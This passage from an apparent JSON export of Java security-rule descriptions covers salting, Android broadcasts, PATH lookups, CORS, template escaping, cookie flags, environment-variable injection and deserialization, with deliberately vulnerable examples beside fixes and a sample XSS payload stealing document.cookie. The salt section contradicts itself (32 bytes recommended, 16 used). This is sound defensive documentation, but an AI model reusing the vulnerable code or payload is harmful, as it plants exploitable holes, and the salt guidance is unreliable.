{\n    SecureRandom random = new SecureRandom();\n    byte[] salt = new byte[16];\n    random.nextBytes(salt);\n\n    PBEParameterSpec cipherSpec = new PBEParameterSpec(salt, 10000);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that\nprovides the required security level. It uses a salt length of at least 32 bytes (256 bits), as recommended by industry standards.</p>\n<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>nextBytes</code> method from the\n<code>SecureRandom</code> class with a salt buffer of 16 bytes. This class implements a cryptographically secure pseudo-random number generator.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/759\">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/760\">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5320": {
        "name": "Broadcasting intents is security-sensitive",
        "htmlDesc": "<p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9489\">CVE-2018-9489</a> </li>\n</ul>\n<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>\n<p>This rule raises an issue when an intent is broadcasted without specifying any \"receiver permission\".</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The intent contains sensitive information. </li>\n  <li> Intent reception is not restricted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Restrict the access to broadcasted intents. See <a\nhref=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> for more\ninformation.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.os.Build;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.os.UserHandle;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentBroadcast {\n    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)\n    public void broadcast(Intent intent, Context context, UserHandle user,\n                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,\n                          String initialData, Bundle initialExtras,\n                          String broadcastPermission) {\n        context.sendBroadcast(intent); // Sensitive\n        context.sendBroadcastAsUser(intent, user); // Sensitive\n\n        // Broadcasting intent with \"null\" for receiverPermission\n        context.sendBroadcast(intent, null); // Sensitive\n        context.sendBroadcastAsUser(intent, user, null); // Sensitive\n        context.sendOrderedBroadcast(intent, null); // Sensitive\n        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,\n                scheduler, initialCode, initialData, initialExtras); // Sensitive\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.os.Build;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.os.UserHandle;\nimport android.support.annotation.RequiresApi;\n\npublic class MyIntentBroadcast {\n    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)\n    public void broadcast(Intent intent, Context context, UserHandle user,\n                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,\n                          String initialData, Bundle initialExtras,\n                          String broadcastPermission) {\n\n        context.sendBroadcast(intent, broadcastPermission);\n        context.sendBroadcastAsUser(intent, user, broadcastPermission);\n        context.sendOrderedBroadcast(intent, broadcastPermission);\n        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,\n                scheduler, initialCode, initialData, initialExtras);\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment\">Mobile AppSec\n  Verification Standard - Platform Interaction Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage\">Mobile Top 10 2016 Category M1 - Improper\n  Platform Usage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/927\">CWE-927 - Use of Implicit Intent for Sensitive Communication</a> </li>\n  <li> <a href=\"https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions\">Android documentation</a> -\n  Broadcast Overview - Security considerations and best practices </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S4036": {
        "name": "Searching OS commands in PATH is security-sensitive",
        "htmlDesc": "<p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>\nenvironment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in\n<code>PATH</code> is a directory under his control.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>\n<h2>Sensitive Code Example</h2>\n<p>The full path of the command is not specified and thus the executable will be searched in all directories listed in the <code>PATH</code>\nenvironment variable:</p>\n<pre>\nRuntime.getRuntime().exec(\"make\");  // Sensitive\nRuntime.getRuntime().exec(new String[]{\"make\"});  // Sensitive\n\nProcessBuilder builder = new ProcessBuilder(\"make\");  // Sensitive\nbuilder.command(\"make\");  // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>The command is defined by its full path:</p>\n<pre>\nRuntime.getRuntime().exec(\"/usr/bin/make\");  // Compliant\nRuntime.getRuntime().exec(new String[]{\"~/bin/make\"});  // Compliant\n\nProcessBuilder builder = new ProcessBuilder(\"./bin/make\");  // Compliant\nbuilder.command(\"../bin/make\");  // Compliant\nbuilder.command(Arrays.asList(\"..\\bin\\make\", \"-j8\")); // Compliant\n\nbuilder = new ProcessBuilder(Arrays.asList(\".\\make\"));  // Compliant\nbuilder.command(Arrays.asList(\"C:\\bin\\make\", \"-j8\"));  // Compliant\nbuilder.command(Arrays.asList(\"\\\\SERVER\\bin\\make\"));  // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/426\">CWE-426 - Untrusted Search Path</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/427\">CWE-427 - Uncontrolled Search Path Element</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S5122": {
        "name": "Having a permissive Cross-Origin Resource Sharing policy is security-sensitive",
        "htmlDesc": "<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Java servlet framework:</p>\n<pre>\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    resp.setHeader(\"Content-Type\", \"text/plain; charset=utf-8\");\n    resp.setHeader(\"Access-Control-Allow-Origin\", \"*\"); // Sensitive\n    resp.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n    resp.setHeader(\"Access-Control-Allow-Methods\", \"GET\");\n    resp.getWriter().write(\"response\");\n}\n</pre>\n<p>Spring MVC framework:</p>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html\">CrossOrigin</a>\n  </li>\n</ul>\n<pre>\n@CrossOrigin // Sensitive\n@RequestMapping(\"\")\npublic class TestController {\n    public String home(ModelMap model) {\n        model.addAttribute(\"message\", \"ok \");\n        return \"view\";\n    }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html\">cors.CorsConfiguration</a> </li>\n</ul>\n<pre>\nCorsConfiguration config = new CorsConfiguration();\nconfig.addAllowedOrigin(\"*\"); // Sensitive\nconfig.applyPermitDefaultValues(); // Sensitive\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html\">servlet.config.annotation.CorsConfiguration</a> </li>\n</ul>\n<pre>\nclass Insecure implements WebMvcConfigurer {\n  @Override\n  public void addCorsMappings(CorsRegistry registry) {\n    registry.addMapping(\"/**\")\n      .allowedOrigins(\"*\"); // Sensitive\n  }\n}\n</pre>\n<p>User-controlled origin:</p>\n<pre>\npublic ResponseEntity&lt;String&gt; userControlledOrigin(@RequestHeader(\"Origin\") String origin) {\n  HttpHeaders responseHeaders = new HttpHeaders();\n  responseHeaders.add(\"Access-Control-Allow-Origin\", origin); // Sensitive\n\n  return new ResponseEntity&lt;&gt;(\"content\", responseHeaders, HttpStatus.CREATED);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Java Servlet framework:</p>\n<pre>\n@Override\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n    resp.setHeader(\"Content-Type\", \"text/plain; charset=utf-8\");\n    resp.setHeader(\"Access-Control-Allow-Origin\", \"trustedwebsite.com\"); // Compliant\n    resp.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n    resp.setHeader(\"Access-Control-Allow-Methods\", \"GET\");\n    resp.getWriter().write(\"response\");\n}\n</pre>\n<p>Spring MVC framework:</p>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/CrossOrigin.html\">CrossOrigin</a>\n  </li>\n</ul>\n<pre>\n@CrossOrigin(\"trustedwebsite.com\") // Compliant\n@RequestMapping(\"\")\npublic class TestController {\n    public String home(ModelMap model) {\n        model.addAttribute(\"message\", \"ok \");\n        return \"view\";\n    }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/cors/CorsConfiguration.html\">cors.CorsConfiguration</a> </li>\n</ul>\n<pre>\nCorsConfiguration config = new CorsConfiguration();\nconfig.addAllowedOrigin(\"http://domain2.com\"); // Compliant\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/CorsRegistration.html\">servlet.config.annotation.CorsConfiguration</a> </li>\n</ul>\n<pre>\nclass Safe implements WebMvcConfigurer {\n  @Override\n  public void addCorsMappings(CorsRegistry registry) {\n    registry.addMapping(\"/**\")\n      .allowedOrigins(\"safe.com\"); // Compliant\n  }\n}\n</pre>\n<p>User-controlled origin validated with an allow-list:</p>\n<pre>\npublic ResponseEntity&lt;String&gt; userControlledOrigin(@RequestHeader(\"Origin\") String origin) {\n  HttpHeaders responseHeaders = new HttpHeaders();\n  if (trustedOrigins.contains(origin)) {\n    responseHeaders.add(\"Access-Control-Allow-Origin\", origin);\n  }\n\n  return new ResponseEntity&lt;&gt;(\"content\", responseHeaders, HttpStatus.CREATED);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/346\">CWE-346 - Origin Validation Error</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/942\">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "java:S5247": {
        "name": "Disabling auto-escaping in template engines is security-sensitive",
        "htmlDesc": "<p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,\n<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters\nthat make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>\n<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a\nhref=\"https://twig.symfony.com/doc/3.x/filters/escape.html\">the strategy applied</a> and the context, for example a \"html auto-escaping\" strategy\n(which only transforms html characters into <a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Entity\">html entities</a>) will not be relevant\nwhen variables are used in a <a href=\"https://en.wikipedia.org/wiki/HTML_attribute\">html attribute</a> because '<code>:</code>' character is not\nescaped and thus an attack as below is possible:</p>\n<pre>\n&lt;a href=\"{{ myLink }}\"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)\n&lt;a href=\"javascript:alert(document.cookie)\"&gt;link&lt;/a&gt; // JS injection (XSS attack)\n</pre>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Templates are used to render web content and\n    <ul>\n      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>\n      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right\none.</p>\n<h2>Sensitive Code Example</h2>\n<p>With <a href=\"https://github.com/samskivert/jmustache\">JMustache by samskivert</a>:</p>\n<pre>\nMustache.compiler().escapeHTML(false).compile(template).execute(context); // Sensitive\nMustache.compiler().withEscaper(Escapers.NONE).compile(template).execute(context); // Sensitive\n</pre>\n<p>With <a href=\"https://freemarker.apache.org/\">Freemarker</a>:</p>\n<pre>\nfreemarker.template.Configuration configuration = new freemarker.template.Configuration();\nconfiguration.setAutoEscapingPolicy(DISABLE_AUTO_ESCAPING_POLICY); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>With <a href=\"https://github.com/samskivert/jmustache\">JMustache by samskivert</a>:</p>\n<pre>\nMustache.compiler().compile(template).execute(context); // Compliant, auto-escaping is enabled by default\nMustache.compiler().escapeHTML(true).compile(template).execute(context); // Compliant\n</pre>\n<p>With <a href=\"https://freemarker.apache.org/\">Freemarker</a>. See <a\nhref=\"https://freemarker.apache.org/docs/api/freemarker/template/Configuration.html#setAutoEscapingPolicy-int-\">\"setAutoEscapingPolicy\"\ndocumentation</a> for more details.</p>\n<pre>\nfreemarker.template.Configuration configuration = new freemarker.template.Configuration();\nconfiguration.setAutoEscapingPolicy(ENABLE_IF_DEFAULT_AUTO_ESCAPING_POLICY); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S2092": {
        "name": "Creating cookies without the \"secure\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP\nrequest and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>\n  <li> it’s not sure that the website contains <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">mixed content</a> or not\n  (ie HTTPS everywhere or not) </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour\n  when creating cookies. </li>\n  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>If you create a security-sensitive cookie in your JAVA code:</p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setSecure(false);  // Sensitive: a security-ensitive cookie is created with the secure flag set to false\n</pre>\n<p>By default the <a href=\"https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure(boolean)\"><code>secure</code></a> flag is set\nto <em>false:</em></p>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCookie c = new Cookie(COOKIENAME, sensitivedata);\nc.setSecure(true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag set to true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/614\">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javasecurity:S6547": {
        "name": "Environment variables should not be defined from untrusted input",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Environment variable injection occurs in an application when the application receives data from a user or a third-party service and, without\nsanitizing it first, does the following:</p>\n<ul>\n  <li> Creates an environment variable based on the external data. </li>\n  <li> Inserts the external data into certain sensitive environment variables, such as <code>PATH</code> or <code>LD_PRELOAD</code>.   <pre>\nIf an application uses environment variables that are vulnerable to injection, it is exposed\nto a variety of attacks that aim to exploit supposedly safe environment variables, such as `PATH`.\n</pre>   </li>\n</ul>\n<p>A user with malicious intent carefully performs actions aimed at modifying or adding environment variables to profit from it.</p>\n<h3>What is the potential impact?</h3>\n<p>When user-supplied values are used to manipulate environment variables, an attacker can supply carefully chosen values that cause the system to\nbehave unexpectedly.<br> In some cases, the attacker can use this capability to execute arbitrary code on the server.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attacker manages to inject an environment variable that is recognized and used by the remote system. For example, this could\nbe the secret of a particular cloud provider used in an environment variable, or <code>PATH</code>.</p>\n<p>Depending on the application, the attacker can read or modify important data or perform unwanted actions.<br> For example, injecting data into the\n<code>HTTP_PROXY</code> variable could lead to data leakage.</p>\n<h4>Application compromise</h4>\n<p>In the worst case, an attacker manages to inject an important environment variable such as <code>LD_PRELOAD</code> and execute code by overriding\ntrusted code.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, and for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to environment variable manipulation as it constructs the variables from untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n  Runtime r = Runtime.getRuntime();\n  String userInput = request.getParameter(\"example\");\n\n  if (userInput != null) {\n    String[] envs = {userInput};\n    r.exec(\"/path/to/example\", userInput);\n  } else{\n    r.exec(\"/path/to/example\");\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n  Runtime r = Runtime.getRuntime();\n  String userInput = request.getParameter(\"example\");\n\n  if (userInput != null &amp;&amp; userInput.matches(\"^[a-zA-Z0-9]*$\")) {\n    String[] envs = {\"ENV_VAR=%s\".format(userInput)};\n    r.exec(\"/path/to/example\", envs);\n  } else {\n    r.exec(\"/path/to/example\");\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure environment variables that you want the application to be able to use.<br> If a user input does not match an\nentry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/454\">CWE-454 - External Initialization of Trusted Variables or Data Stores</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javasecurity:S5135": {
        "name": "Deserialization should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a\ncarefully-crafted payload into the application.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s\nbehavior.</p>\n<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges\nor perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code\nexecution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to\nelevate his privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class RequestProcessor {\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n    ServletInputStream servletIS = request.getInputStream();\n    ObjectInputStream  objectIS  = new ObjectInputStream(servletIS);\n    Object input                 = objectIS.readObject();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class SecureObjectInputStream extends ObjectInputStream {\n\n  @Override\n  protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {\n\n    List&lt;String&gt; approvedClasses = new ArrayList&lt;String&gt;();\n    approvedClasses.add(AllowedClass1.class.getName());\n    approvedClasses.add(AllowedClass2.class.getName());\n\n    if (!approvedClasses.contains(osc.getName())) {\n      throw new InvalidClassException(\"Unauthorized deserialization\", osc.getName());\n    }\n\n    return super.resolveClass(osc);\n  }\n}\n\npublic class RequestProcessor {\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n    ServletInputStream servletIS = request.getInputStream();\n    ObjectInputStream  objectIS  = new SecureObjectInputStream(servletIS);\n    Object input                 = objectIS.readObject();\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>\n<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to\navoid deserialization in the first place.</p>\n<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>\n<h4>More secure serialization methods</h4>\n<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>\n<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>\nIn this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>\n<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most\ncommon method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the\nProtobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>\n<h4>Integrity check</h4>\n<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application\nserver:</p>\n<ul>\n  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>\n  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>\n</ul>\n<p>Depending on the situation, two MAC computation modes can be used.</p>\n<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC\nshould be preferred, with a strong underlying hash algorithm such as SHA-256.</p>\n<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a\nsigning secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>\n<p><strong>Note</strong>: Be sure to 